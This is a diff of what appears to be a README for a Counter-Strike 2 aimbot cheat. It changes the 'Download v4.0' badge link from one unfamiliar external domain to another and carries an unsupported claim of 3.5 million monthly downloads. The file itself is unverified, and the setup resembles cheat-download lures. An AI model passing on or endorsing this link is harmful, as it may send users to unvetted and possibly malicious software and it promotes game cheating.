@@ -49,7 +49,7 @@ A: External — does not inject into CS2 process.
 
 **Monthly downloads:** 3.5m+
 
-[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/cs2aimbot26)
+[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/cs2aimbot26)
 
 ---
 
